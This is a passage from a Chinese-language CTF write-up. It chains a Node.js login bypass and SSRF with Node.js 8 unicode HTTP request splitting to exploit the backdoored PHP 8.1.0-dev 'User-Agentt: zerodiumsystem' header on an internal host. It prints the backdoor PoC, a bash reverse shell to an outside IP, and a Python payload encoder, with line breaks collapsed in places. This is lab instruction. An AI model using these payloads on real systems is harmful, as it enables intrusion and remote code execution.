3. 审计源码后可知主要存在 /login、/search、/home、/hint 这几个路由。其中 /login 路由用于登录，在最开始那里的admin_hash我们可知管理员的用户名和密码都是 administrator，但是登录逻辑的代码限制我们登陆的用户名与密码不能一样、长度也不能相等，而且用户名也不能为 administrator。所以这里要想办法进行绕过。

4. 登录到管理员之后我们便可以使用 /search、/home、/hint 这几个路由了，/search 路由可以传递一个参数进行访问，很可能存在 ssrf；/hint 路由必须从本地 127.0.0.1 访问。

11. 可知内网中的那个 web 站点使用的是 PHP 8.1.0。我们知道，在今年三四月份的时候PHP Git 服务器被入侵，PHP 8.1.0-dev 版本的源码被植入了后门：

12. 当服务器使用存在后门的 PHP 版本时，攻击者可以通过发送 User-Agentt 头来执行任意代码。

后门使用poc如下：

GET / HTTP/1.1Host: your-ip:80Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36User-Agentt: zerodiumsystem('ls /');Connection: close

13. 由于这个内网主机上使用的也是PHP 8.1.0-dev，我们猜测这个内网主机应该也存在这个后门。这个后门的利用要使用 User-Agentt 头来执行任意代码，也就是说我们要通过ssrf发送完整的http请求。这里我们可以通过nodejs 8 unicode 字节损坏造成的 HTTP 拆分攻击来发送完整的 HTTP 请求，详情请看：https://xz.aliyun.com/t/2894

14. nodejs unicode 字节损坏造成的 SSRF 打内网

首先构造原始的HTTP请求：

GET / HTTP/1.1Host: 172.27.0.2:80Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36User-Agentt: zerodiumsystem('bash -c "bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1"');Connection: close

（User-Agentt头的zerodiumsystem()函数中是要执行的命令）

15. 然后编写如下 exp 生成符合 NodeJS 8 HTTP 拆分攻击要求的 Payload：

import urllib.parseimport requests
payload = ''' HTTP/1.1
GET / HTTP/1.1Host: 172.27.0.2:80Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36User-Agentt: zerodiumsystem('bash -c "bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1"');Connection: close
GET / HTTP/1.1test:'''.replace("\n", "\r\n")
def payload_encode(raw):    ret = u""    for i in raw:        ret += chr(0x0100+ord(i))    return ret
payload = payload_encode(payload)print(payload)
